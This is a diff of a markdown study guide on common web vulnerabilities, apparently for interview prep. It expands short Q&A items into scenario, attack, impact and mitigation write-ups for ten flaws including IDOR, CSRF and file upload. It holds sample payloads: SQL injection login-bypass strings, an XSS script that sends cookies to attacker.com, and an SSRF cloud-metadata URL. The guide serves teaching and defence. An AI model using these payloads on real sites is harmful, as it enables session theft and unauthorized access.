@@ -256,109 +256,109 @@ Login with `admin/admin`
 ---
 
 🧾 **2. Broken Access Control**
-Q: What is broken access control?
+**Q: What is broken access control?**
 👉 When users can perform actions or access data beyond their privilege level.
 
-Q: Example?
+**Q: Example?**
 👉 Normal user accessing /admin/dashboard.
 
-Q: Impact?
+**Q: Impact?**
 👉 Data leakage and privilege escalation.
 
 ---
 
 🔓 **3. IDOR**
-Q: What is IDOR?
+**Q: What is IDOR?**
 👉 A vulnerability where object references (like IDs) are exposed without authorization checks.
 
-Q: How to identify?
+**Q: How to identify?**
 👉 Change ID in request and check if other user’s data is accessible.
 
-Q: Impact?
+**Q: Impact?**
 👉 Unauthorized access to sensitive user data.
 
 ---
 
 🧑‍💻 **4. SQL Injection**
-Q: What is SQL Injection?
+**Q: What is SQL Injection?**
 👉 Injection of malicious SQL queries into input fields.
 
-Q: Example payload?
+**Q: Example payload?**
 👉 ' OR 1=1 --
 
-Q: Impact?
+**Q: Impact?**
 👉 Database dump, login bypass, data manipulation.
 
 ---
 
 🌐 **5. XSS**
-Q: What is XSS?
+**Q: What is XSS?**
 👉 Injection of malicious JavaScript into web pages viewed by users.
 
-Q: Types?
+**Q: Types?**
 👉 Stored, Reflected, DOM-based.
 
-Q: Impact?
+**Q: Impact?**
 👉 Cookie theft, session hijacking.
 
 ---
 
 🔁 **6. CSRF**
-Q: What is CSRF?
+**Q: What is CSRF?**
 👉 Trick a logged-in user into performing unwanted actions.
 
-Q: How it works?
+**Q: How it works?**
 👉 Exploits missing CSRF token validation.
 
-Q: Impact?
+**Q: Impact?**
 👉 Unauthorized actions like password/email change.
 
 ---
 
 📂** 7. File Upload Vulnerability**
-Q: What is file upload vulnerability?
+**Q: What is file upload vulnerability?**
 👉 When system allows unsafe files to be uploaded without proper validation.
 
-Q: Risk?
+**Q: Risk?**
 👉 Upload of malicious scripts (web shells).
 
-Q: Impact?
+**Q: Impact?**
 👉 Remote code execution or server compromise.
 
 ---
 
 🌍 **8. SSRF**
-Q: What is SSRF?
+**Q: What is SSRF?**
 👉 Server is tricked into making requests to internal or external systems.
 
-Q: Example?
+**Q: Example?**
 👉 Changing URL input to http://localhost.
 
-Q: Impact?
+**Q: Impact?**
 👉 Internal network exposure, cloud metadata access.
 
 ---
 
 🔎 **9. Information Disclosure**
-Q: What is information disclosure?
+**Q: What is information disclosure?**
 👉 Sensitive data is exposed unintentionally.
 
-Q: Examples?
+**Q: Examples?**
 👉 .env files, debug logs, API keys in frontend.
 
-Q: Impact?
+**Q: Impact?**
 👉 Helps attackers plan further attacks.
 
 ---
 
 ⚙️ **10. Security Misconfiguration**
-Q: What is security misconfiguration?
+**Q: What is security misconfiguration?**
 👉 Improperly configured security settings in application or server.
 
-Q: Example?
+**Q: Example?**
 👉 Default credentials, debug mode ON.
 
-Q: Impact?
+**Q: Impact?**
 👉 Easy entry point for attackers.
 
 
@@ -366,46 +366,193 @@ Q: Impact?
 
 # 🔹 PART 3: REAL-WORLD SCENARIOS
 
-## 🔐 Authentication Bypass
+## 🔐 1. Authentication Bypass
 
-Startup OTP system validated only frontend → attacker skipped OTP → account takeover.
+🧠 Scenario  
+A startup had OTP-based login for users.
 
-## 🧾 Broken Access Control
+⚔️ Attack  
+Attacker intercepted the OTP verification request and noticed:  
+• OTP was validated only on frontend  
+• Backend accepted request without verifying OTP properly  
 
-Student accessed `/admin/dashboard` → no backend check → admin access.
+They simply skipped OTP validation request and got logged in.
 
-## 🔓 IDOR
+💥 Impact  
+Full account takeover without knowing password or OTP.
 
-Invoice ID modified → accessed other users' financial data.
+🎯 Lesson  
+👉 Always validate authentication on server side, not frontend.
 
-## 🧑‍💻 SQL Injection
+---
 
-Login query manipulated → bypass authentication → DB compromise.
+## 🧾 2. Broken Access Control
 
-## 🌐 XSS
+🧠 Scenario  
+An e-learning platform had separate roles: student & admin.
 
-Malicious script in comments → cookie theft.
+⚔️ Attack  
+Attacker logged in as student → captured request → changed endpoint:  
+• /user/dashboard → /admin/dashboard  
 
-## 🔁 CSRF
+Backend didn’t verify role.
 
-Malicious link triggered fund transfer.
+💥 Impact  
+Attacker got admin panel access → could modify courses & users.
 
-## 📂 File Upload
+🎯 Lesson  
+👉 Every request must enforce authorization checks on backend.
 
-Uploaded `shell.php` → remote server control.
+---
 
-## 🌍 SSRF
+## 🔓 3. IDOR
 
-Accessed cloud metadata → leaked credentials.
+🧠 Scenario  
+A fintech app allowed users to download invoices.
 
-## 🔎 Information Disclosure
+⚔️ Attack  
+URL looked like:  
+/invoice?id=1001  
 
-Exposed `.env` → leaked API keys.
+Attacker changed ID:  
+1001 → 1002 → 1003  
 
-## ⚙️ Security Misconfiguration
+💥 Impact  
+Access to other users’ invoices (financial data leak).
 
-Default admin credentials → full system control.
+🎯 Lesson  
+👉 Never trust direct object references without ownership validation.
 
+---
+
+## 🧑‍💻 4. SQL Injection
+
+🧠 Scenario  
+Login form directly used user input in SQL query.
+
+⚔️ Attack  
+Attacker entered:  
+admin' OR '1'='1  
+
+Query became always true → login bypass.
+
+💥 Impact  
+Unauthorized admin access + potential full database dump.
+
+🎯 Lesson  
+👉 Use parameterized queries (prepared statements).
+
+---
+
+## 🌐 5. XSS
+
+🧠 Scenario  
+A blogging site allowed comments without sanitization.
+
+⚔️ Attack  
+Attacker posted:  
+<script>fetch('https://attacker.com?cookie='+document.cookie)</script>  
+
+Whenever someone viewed comment → script executed.
+
+💥 Impact  
+Session cookies stolen → account hijacking.
+
+🎯 Lesson  
+👉 Always sanitize and encode user input before rendering.
+
+## 🔁 6. CSRF (Cross-Site Request Forgery)
+
+🧠 Scenario  
+Banking site had no CSRF protection.
+
+⚔️ Attack  
+Attacker created malicious page with hidden form:  
+• Auto-submits transfer request when user visits page  
+
+Victim (logged in) clicks link → money transferred.
+
+💥 Impact  
+Unauthorized financial transaction.
+
+🎯 Lesson  
+👉 Use CSRF tokens + SameSite cookies.
+
+---
+
+## 📂 7. File Upload Vulnerability
+
+🧠 Scenario  
+Website allowed profile picture upload.
+
+⚔️ Attack  
+Attacker uploaded:  
+shell.php disguised as image  
+
+Server stored file without validation.  
+Then attacker accessed:  
+/uploads/shell.php  
+
+💥 Impact  
+Remote command execution → full server compromise.
+
+🎯 Lesson  
+👉 Validate file type, content, and restrict execution.
+
+---
+
+## 🌍 8. SSRF (Server-Side Request Forgery)
+
+🧠 Scenario  
+App allowed users to import images via URL.
+
+⚔️ Attack  
+Attacker changed URL to:  
+http://169.254.169.254/latest/meta-data  
+
+(Server’s internal cloud metadata endpoint)
+
+💥 Impact  
+Leaked cloud credentials → full infrastructure access.
+
+🎯 Lesson  
+👉 Restrict internal requests and validate URLs.
+
+---
+
+## 🔎 9. Information Disclosure
+
+🧠 Scenario  
+Production server accidentally exposed .env file.
+
+⚔️ Attack  
+Attacker accessed:  
+website.com/.env  
+
+💥 Impact  
+Database credentials, API keys leaked → full system compromise.
+
+🎯 Lesson  
+👉 Never expose sensitive files publicly.
+
+---
+
+## ⚙️ 10. Security Misconfiguration
+
+🧠 Scenario  
+Admin panel deployed with default credentials.
+
+⚔️ Attack  
+Attacker tried:  
+admin / admin  
+
+Login successful.
+
+💥 Impact  
+Full admin control → data modification, deletion.
+
+🎯 Lesson  
+👉 Always change defaults and harden configs.
 ---
 
 # 🔥 FINAL NOTE
